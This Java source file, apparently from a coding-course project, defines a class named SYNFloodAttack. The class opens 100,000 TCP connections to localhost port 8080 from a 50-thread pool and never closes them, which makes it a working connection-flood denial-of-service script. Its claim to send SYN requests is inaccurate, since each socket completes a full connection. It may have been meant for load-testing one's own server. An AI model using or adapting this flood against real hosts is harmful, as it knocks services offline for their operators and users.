package io.codeforall.fanstatics;

import java.io.IOException;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SYNFloodAttack {
    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 8080;
    private static final int CONNECTIONS = 100000;

    public static void main(String[] args) {
        ExecutorService executorService = Executors.newFixedThreadPool(50);
        for (int i = 0; i < CONNECTIONS; i++) {
            executorService.submit(() -> {
                try {
                    new Socket(SERVER_ADDRESS, SERVER_PORT);
                    System.out.println("Sent SYN request to server.");
                } catch (IOException e) {
                    System.err.println("Connection failed: " + e.getMessage());
                }
            });
        }
        executorService.shutdown();
    }
}

